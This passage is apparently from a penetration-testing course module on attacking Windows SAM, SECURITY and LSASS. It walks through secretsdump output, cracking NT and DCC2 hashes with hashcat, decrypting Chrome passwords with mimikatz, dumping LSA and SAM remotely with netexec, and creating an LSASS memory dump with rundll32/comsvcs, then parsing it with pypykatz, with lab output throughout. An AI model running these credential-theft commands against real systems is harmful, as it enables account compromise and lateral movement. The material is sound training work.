 <span class="hljs-number">0030</span>   <span class="hljs-number">9</span>B <span class="hljs-number">7</span>B <span class="hljs-number">8</span>B BF <span class="hljs-number">3</span>D <span class="hljs-number">59</span> DB <span class="hljs-number">90</span>  D8 C7 AB <span class="hljs-number">62</span> <span class="hljs-number">93</span> <span class="hljs-number">30</span> <span class="hljs-number">6</span>A <span class="hljs-number">42</span>   .{..=Y.....b<span class="hljs-number">.0</span>jB
<span class="hljs-string">NL$KM:</span>d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up...
</code></pre>
<p>Here we see that <code>secretsdump</code> successfully dumped the <code>local</code> SAM hashes, along with data from <code>hklm\security</code>, including cached domain logon information and LSA secrets such as the machine and user keys for DPAPI.</p>
<p>Notice that the first step <code>secretsdump</code> performs is retrieving the <code>system bootkey</code> before proceeding to dump the <code>local SAM hashes</code>. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives, as discussed earlier, is crucial.</p>
<p>Moving on, notice the following line:</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-shell-session">Dumping local SAM hashes (<span class="hljs-name">uid</span><span class="hljs-symbol">:rid</span><span class="hljs-symbol">:lmhash</span><span class="hljs-symbol">:nthash</span>)
</code></pre>
<p>This tells us how to interpret the output and which hashes we can attempt to crack. Most modern Windows operating systems store passwords as <code>NT hashes</code>. Older systems (such as those prior to Windows Vista and Windows Server 2008) may store passwords as <code>LM hashes</code>, which are weaker and easier to crack. Therefore, LM hashes are useful if the target is running an older version of Windows.</p>
<p>With this in mind, we can copy the NT hashes associated with each user account into a text file and begin cracking passwords. It is helpful to note which hash corresponds to which user to keep track of the results.</p>
<h3 id="cracking-hashes-with-hashcat">Cracking hashes with Hashcat</h3>
<p>Once we have the hashes, we can begin cracking them using <a href="https://hashcat.net/hashcat/">Hashcat</a>. Hashcat supports a wide range of hashing algorithms, as outlined on its website. In this module, we will focus on using Hashcat for specific use cases. This approach will help build your understanding of how and when to use Hashcat effectively, and how to refer to its documentation to identify the appropriate mode and options based on the type of hashes you&#39;ve captured.</p>
<p>As mentioned earlier, we can populate a text file with the NT hashes we were able to dump.</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo vim hashestocrack.txt

<span class="hljs-number">64</span>f12cddaa88057e06a81b54e73b949b
<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0
<span class="hljs-number">6</span>f8c3f4d3869a10f3b4f0522f537fd33
<span class="hljs-number">184</span>ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
</code></pre>
<p>Now that the NT hashes are in our text file (<code>hashestocrack.txt</code>), we can use Hashcat to crack them.</p>
<p><strong>Running Hashcat against NT hashes</strong></p>
<p>Hashcat supports many different modes, and selecting the right one depends largely on the type of attack and the specific hash type we want to crack. Covering all available modes is beyond the scope of this module, so we will focus on using the <code>-m</code> option to specify hash type <code>1000</code>, which corresponds to NT hashes (also known as NTLM-based hashes). For a full list of supported hash types and their associated mode numbers, we can refer to Hashcat&#39;s <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">wiki page</a> or consult the man page.</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo hashcat -m <span class="hljs-number">1000</span> hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6<span class="hljs-number">.1</span><span class="hljs-number">.1</span>) starting...

&lt;SNIP&gt;

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: <span class="hljs-number">14344385</span>
* Bytes.....: <span class="hljs-number">139921507</span>
* Keyspace..: <span class="hljs-number">14344385</span>

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
<span class="hljs-number">6</span>f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
<span class="hljs-number">184</span>ecdda8cf1dd238d438c4aea4d560d:adrian          
<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:                

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec <span class="hljs-number">14</span> <span class="hljs-number">14</span>:<span class="hljs-number">16</span>:<span class="hljs-number">56</span> <span class="hljs-number">2021</span> (<span class="hljs-number">0</span> secs)
Time.Estimated...: Tue Dec <span class="hljs-number">14</span> <span class="hljs-number">14</span>:<span class="hljs-number">16</span>:<span class="hljs-number">56</span> <span class="hljs-number">2021</span> (<span class="hljs-number">0</span> secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:    <span class="hljs-number">14284</span> H/s (<span class="hljs-number">0.63</span>ms) @ Accel:<span class="hljs-number">1024</span> Loops:<span class="hljs-number">1</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">5</span>/<span class="hljs-number">5</span> (<span class="hljs-number">100.00</span>%) Digests
Progress.........: <span class="hljs-number">8192</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.06</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">8192</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">4096</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.03</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-1</span>
Candidates.#<span class="hljs-number">1.</span>...: newzealand -&gt; whitetiger

Started: Tue Dec <span class="hljs-number">14</span> <span class="hljs-number">14</span>:<span class="hljs-number">16</span>:<span class="hljs-number">50</span> <span class="hljs-number">2021</span>
Stopped: Tue Dec <span class="hljs-number">14</span> <span class="hljs-number">14</span>:<span class="hljs-number">16</span>:<span class="hljs-number">58</span> <span class="hljs-number">2021</span>
</code></pre>
<p>We can see from the output that Hashcat was successful in cracking three of the hashes. Having these passwords can be useful in many ways. For example, we could attempt to use the cracked credentials to access other systems on the network. It is very common for users to reuse passwords across different work and personal accounts. Understanding and applying this technique can be valuable during assessments. We will benefit from it anytime we encounter a vulnerable Windows system and gain administrative rights to dump the SAM database.</p>
<p>Keep in mind that this is a well-known technique, and administrators may have implemented safeguards to detect or prevent it. Several detection and mitigation strategies are <a href="https://attack.mitre.org/techniques/T1003/002/">documented</a> within the MITRE ATT\&amp;CK framework.</p>
<h3 id="dcc2-hashes">DCC2 hashes</h3>
<p>As mentioned previously, <code>hklm\security</code> contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:</p>
<pre><code>inlanefreight.<span class="hljs-keyword">local</span>/Administrator:$DCC2$10240<span class="hljs-meta">#administrator#23d97555681813db79b2ade4b4a6ff25</span>
</code></pre><p>This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash (which we will cover later). The Hashcat mode for cracking DCC2 hashes is <code>2100</code>.</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat -m <span class="hljs-number">2100</span> <span class="hljs-string">'$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25'</span> /usr/share/wordlists/rockyou.txt

&lt;SNIP&gt;

$DCC2$<span class="hljs-number">10240</span>#administrator#<span class="hljs-number">23</span>d97555681813db79b2ade4b4a6ff25:ihatepasswords

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: <span class="hljs-number">2100</span> (Domain Cached Credentials <span class="hljs-number">2</span> (DCC2), MS Cache <span class="hljs-number">2</span>)
Hash.Target......: $DCC2$<span class="hljs-number">10240</span>#administrator#<span class="hljs-number">23</span>d97555681813db79b2ade4b4a6ff25
Time.Started.....: Tue Apr <span class="hljs-number">22</span> <span class="hljs-number">09</span>:<span class="hljs-number">12</span>:<span class="hljs-number">53</span> <span class="hljs-number">2025</span> (<span class="hljs-number">27</span> secs)
Time.Estimated...: Tue Apr <span class="hljs-number">22</span> <span class="hljs-number">09</span>:<span class="hljs-number">13</span>:<span class="hljs-number">20</span> <span class="hljs-number">2025</span> (<span class="hljs-number">0</span> secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:     <span class="hljs-number">5536</span> H/s (<span class="hljs-number">8.70</span>ms) @ Accel:<span class="hljs-number">256</span> Loops:<span class="hljs-number">1024</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (total), <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (new)
Progress.........: <span class="hljs-number">149504</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">1.04</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">149504</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">148992</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">1.04</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">9216</span><span class="hljs-number">-10239</span>
Candidate.Engine.: Device Generator
Candidates.#<span class="hljs-number">1.</span>...: ilovelloyd -&gt; gerber1
Hardware.Mon.#<span class="hljs-number">1.</span>.: Util: <span class="hljs-number">95</span>%

Started: Tue Apr <span class="hljs-number">22</span> <span class="hljs-number">09</span>:<span class="hljs-number">12</span>:<span class="hljs-number">33</span> <span class="hljs-number">2025</span>
Stopped: Tue Apr <span class="hljs-number">22</span> <span class="hljs-number">09</span>:<span class="hljs-number">13</span>:<span class="hljs-number">22</span> <span class="hljs-number">2025</span>
</code></pre>
<p>Note the cracking speed of <code>5536 H/s</code>. On the same machine, NTLM hashes can be cracked at <code>4605.4 kH/s</code>. This means that cracking DCC2 hashes is approximately <code>800 times slower</code>. The exact numbers will depend heavily on the hardware available, of course, but the takeaway is that strong passwords are often uncrackable within typical penetration testing timeframes.</p>
<h3 id="dpapi">DPAPI</h3>
<p>In addition to the DCC2 hashes, we previously saw that the <code>machine and user keys</code> for <code>DPAPI</code> were also dumped from <code>hklm\security</code>. The Data Protection Application Programming Interface, or <a href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">DPAPI</a>, is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. Below are just a few examples of applications that use DPAPI and how they use it:</p>
<table>
<thead>
<tr>
<th>Applications</th>
<th>Use of DPAPI</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Internet Explorer</code></td>
<td>Password form auto-completion data (username and password for saved sites).</td>
</tr>
<tr>
<td><code>Google Chrome</code></td>
<td>Password form auto-completion data (username and password for saved sites).</td>
</tr>
<tr>
<td><code>Outlook</code></td>
<td>Passwords for email accounts.</td>
</tr>
<tr>
<td><code>Remote Desktop Connection</code></td>
<td>Saved credentials for connections to remote machines.</td>
</tr>
<tr>
<td><code>Credential Manager</code></td>
<td>Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.</td>
</tr>
</tbody>
</table>
<p>DPAPI encrypted credentials can be decrypted manually with tools like Impacket&#39;s <a href="https://github.com/fortra/impacket/blob/master/examples/dpapi.py">dpapi</a>, <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>, or remotely with <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a>.</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-cmd-session">C:\Users\Public&gt; mimikatz.exe
mimikatz <span class="hljs-comment"># dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect</span>
&gt; Encrypted Key found <span class="hljs-keyword">in</span> <span class="hljs-built_in">local</span> state <span class="hljs-built_in">file</span>
&gt; Encrypted Key seems <span class="hljs-built_in">to</span> be protected <span class="hljs-keyword">by</span> DPAPI
 * <span class="hljs-keyword">using</span> CryptUnprotectData API
&gt; AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

<span class="hljs-built_in">URL</span>     : <span class="hljs-keyword">http</span>://<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.94</span>/ ( <span class="hljs-keyword">http</span>://<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.94</span>/login.html )
Username: bob
 * <span class="hljs-keyword">using</span> BCrypt <span class="hljs-keyword">with</span> AES<span class="hljs-number">-256</span>-GCM
Password: April2025!
</code></pre>
<h3 id="remote-dumping-lsa-secrets-considerations">Remote dumping &amp; LSA secrets considerations</h3>
<p>With access to credentials that have <code>local administrator privileges</code>, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.</p>
<p><strong>Dumping LSA secrets remotely</strong></p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ netexec smb <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.198</span> --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.198</span>   <span class="hljs-number">445</span>    WS01     [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">18362</span> x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.198</span>   <span class="hljs-number">445</span>    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.198</span>   <span class="hljs-number">445</span>    WS01     [+] Dumping LSA secrets
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.198</span>   <span class="hljs-number">445</span>    WS01     WS01\worker:Hello123
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.198</span>   <span class="hljs-number">445</span>    WS01      dpapi_machinekey:<span class="hljs-number">0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce</span>
<span class="hljs-symbol">dpapi_userkey:</span><span class="hljs-number">0x50b9fa0fd79452150111357308748f7ca101944a</span>
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.198</span>   <span class="hljs-number">445</span>    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.198</span>   <span class="hljs-number">445</span>    WS01     [+] Dumped <span class="hljs-number">3</span> LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10<span class="hljs-meta">.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.198_2022</span>-<span class="hljs-number">02</span>-<span class="hljs-number">07_155623.</span>secrets <span class="hljs-keyword">and</span> /home/bob/.cme/logs/FRONTDESK01_10<span class="hljs-meta">.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.198_2022</span>-<span class="hljs-number">02</span>-<span class="hljs-number">07_155623.</span>cached
</code></pre>
<p><strong>Dumping SAM Remotely</strong></p>
<p>Similarly, we can use netexec to dump hashes from the SAM database remotely.</p>
<p>&#x20; Attacking SAM, SYSTEM, and SECURITY</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ netexec smb <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span> --local-auth -u bob -p HTB_<span class="hljs-meta">@cademy</span>_stdnt! --sam

SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01      [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">18362</span> x64 (<span class="hljs-string">name:</span>FRONTDESK01) (<span class="hljs-string">domain:</span>WS01) (<span class="hljs-string">signing:</span>False) (<span class="hljs-string">SMBv1:</span>False)
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01      [+] FRONTDESK01\<span class="hljs-string">bob:</span>HTB_<span class="hljs-meta">@cademy</span>_stdnt! (Pwn3d!)
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01      [+] Dumping SAM hashes
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01      <span class="hljs-string">Administrator:</span><span class="hljs-number">500</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01     <span class="hljs-string">Guest:</span><span class="hljs-number">501</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01     <span class="hljs-string">DefaultAccount:</span><span class="hljs-number">503</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01     <span class="hljs-string">WDAGUtilityAccount:</span><span class="hljs-number">504</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">72639</span><span class="hljs-string">bbb94990305b5a015220f8de34e:</span>::
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01     <span class="hljs-string">bob:</span><span class="hljs-number">1001</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-string">cf3a5525ee9414229e66279623ed5c58:</span>::
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01     <span class="hljs-string">sam:</span><span class="hljs-number">1002</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-string">a3ecf31e65208382e23b3420a34208fc:</span>::
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01     <span class="hljs-string">rocky:</span><span class="hljs-number">1003</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-string">c02478537b9727d391bc80011c2e2321:</span>::
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01     <span class="hljs-string">worker:</span><span class="hljs-number">1004</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">58</span><span class="hljs-string">a478135a93ac3bf058a5ea0e8fdb71:</span>::
SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.198</span>   <span class="hljs-number">445</span>    WS01     [+] Added <span class="hljs-number">8</span> SAM hashes to the database
</code></pre>
<hr>
<h2 id="attacking-lsass">Attacking LSASS</h2>
<p>In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the <a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem Service (LSASS)</a>. As covered in the <code>Credential Storage</code> section of this module, LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/lsassexe_diagram.png" alt="Diagram of Windows authentication process showing interactions between WinLogon.exe, lsass.exe, authentication packages, NTLM, and Kerberos."></p>
<p>Upon initial logon, LSASS will:</p>
<ul>
<li>Cache credentials locally in memory</li>
<li>Create <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">access tokens</a></li>
<li>Enforce security policies</li>
<li>Write to Windows&#39; <a href="https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security">security log</a></li>
</ul>
<p>Let&#39;s cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.</p>
<h3 id="dumping-lsass-process-memory">Dumping LSASS process memory</h3>
<p>Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump, so let&#39;s cover techniques that can be performed using tools already built into Windows.</p>
<p><strong>Task Manager method</strong></p>
<p>With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:</p>
<ol>
<li>Open <code>Task Manager</code></li>
<li>Select the <code>Processes</code> tab</li>
<li>Find and right click the <code>Local Security Authority Process</code></li>
<li>Select <code>Create dump file</code></li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/taskmanagerdump.png" alt="Task Manager showing Local Security Authority Process with right-click menu open, highlighting &#39;Create dump file&#39; option, and lsass.DMP file in search results."></p>
<p>A file called <code>lsass.DMP</code> is created and saved in <code>%temp%</code>. This is the file we will transfer to our attack host. We can use the file transfer method discussed in the previous section of this module to transfer the dump file to our attack host.</p>
<p><strong>Rundll32.exe &amp; Comsvcs.dll method</strong></p>
<p>The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32">rundll32.exe</a>. This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.</p>
<p>Before issuing the command to create the dump file, we must determine what process ID (<code>PID</code>) is assigned to <code>lsass.exe</code>. This can be done from cmd or PowerShell:</p>
<p><strong>Finding LSASS&#39;s PID in cmd</strong></p>
<p>From cmd, we can issue the command <code>tasklist /svc</code> to find <code>lsass.exe</code> and its process ID.</p>
<p>&#x20; Attacking LSASS</p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\Windows\system32&gt; tasklist /svc

<span class="hljs-keyword">Image</span> Name                     PID Services
========================= ======== ============================================
System Idle Process              <span class="hljs-number">0</span> <span class="hljs-keyword">N</span>/A
System                           <span class="hljs-number">4</span> <span class="hljs-keyword">N</span>/A
Registry                        <span class="hljs-number">96</span> <span class="hljs-keyword">N</span>/A
smss.exe                       <span class="hljs-number">344</span> <span class="hljs-keyword">N</span>/A
csrss.exe                      <span class="hljs-number">432</span> <span class="hljs-keyword">N</span>/A
wininit.exe                    <span class="hljs-number">508</span> <span class="hljs-keyword">N</span>/A
csrss.exe                      <span class="hljs-number">520</span> <span class="hljs-keyword">N</span>/A
winlogon.exe                   <span class="hljs-number">580</span> <span class="hljs-keyword">N</span>/A
services.exe                   <span class="hljs-number">652</span> <span class="hljs-keyword">N</span>/A
lsass.exe                      <span class="hljs-number">672</span> KeyIso, SamSs, VaultSvc
svchost.exe                    <span class="hljs-number">776</span> PlugPlay
svchost.exe                    <span class="hljs-number">804</span> BrokerInfrastructure, DcomLaunch, <span class="hljs-keyword">Power</span>,
                                   SystemEventsBroker
fontdrvhost.exe                <span class="hljs-number">812</span> <span class="hljs-keyword">N</span>/A
</code></pre>
<p><strong>Finding LSASS&#39;s PID in PowerShell</strong></p>
<p>From PowerShell, we can issue the command <code>Get-Process lsass</code> and see the process ID in the <code>Id</code> field.</p>
<p>&#x20; Attacking LSASS</p>
<pre><code class="lang-powershell-session"><span class="hljs-comment">PS</span> <span class="hljs-comment">C:\Windows\system32</span>&gt; <span class="hljs-comment">Get</span><span class="hljs-literal">-</span><span class="hljs-comment">Process</span> <span class="hljs-comment">lsass</span>

<span class="hljs-comment">Handles</span>  <span class="hljs-comment">NPM(K)</span>    <span class="hljs-comment">PM(K)</span>      <span class="hljs-comment">WS(K)</span>     <span class="hljs-comment">CPU(s)</span>     <span class="hljs-comment">Id</span>  <span class="hljs-comment">SI</span> <span class="hljs-comment">ProcessName</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>  <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>    <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>      <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>     <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>     <span class="hljs-literal">-</span><span class="hljs-literal">-</span>  <span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
   <span class="hljs-comment">1260</span>      <span class="hljs-comment">21</span>     <span class="hljs-comment">4948</span>      <span class="hljs-comment">15396</span>       <span class="hljs-comment">2</span><span class="hljs-string">.</span><span class="hljs-comment">56</span>    <span class="hljs-comment">672</span>   <span class="hljs-comment">0</span> <span class="hljs-comment">lsass</span>
</code></pre>
<p>Once we have the PID assigned to the LSASS process, we can create a dump file.</p>
<p><strong>Creating a dump file using PowerShell</strong></p>
<p>With an elevated PowerShell session, we can issue the following command to create a dump file:</p>
<p>&#x20; Attacking LSASS</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32&gt; rundll32 C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>omsvcs.dll, MiniDump 672 C:<span class="hljs-symbol">\l</span>sass.dmp full
</code></pre>
<p>With this command, we are running <code>rundll32.exe</code> to call an exported function of <code>comsvcs.dll</code> which also calls the MiniDumpWriteDump (<code>MiniDump</code>) function to dump the LSASS process memory to a specified directory (<code>C:\lsass.dmp</code>). Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.</p>
<p>If we manage to run this command and generate the <code>lsass.dmp</code> file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.</p>
<p>Note: We can use the file transfer method discussed in the Attacking SAM section to get the lsass.dmp file from the target to our attack host.</p>
<h3 id="using-pypykatz-to-extract-credentials">Using Pypykatz to extract credentials</h3>
<p>Once we have the dump file on our attack host, we can use a powerful tool called <a href="https://github.com/skelsec/pypykatz">pypykatz</a> to extract credentials from the <code>.dmp</code> file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.</p>
<p>Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a &quot;snapshot&quot; of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let&#39;s run Pypykatz against the dump file and find out.</p>
<p><strong>Running Pypykatz</strong></p>
<p>The command initiates the use of <code>pypykatz</code> to parse the secrets hidden in the LSASS process memory dump. We use <code>lsa</code> in the command because LSASS is a subsystem of the <code>Local Security Authority</code>, then we specify the data source as a <code>minidump</code> file, proceeded by the path to the dump file stored on our attack host. Pypykatz parses the dump file and outputs the findings:</p>
<p>&#x20; Attacking LSASS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
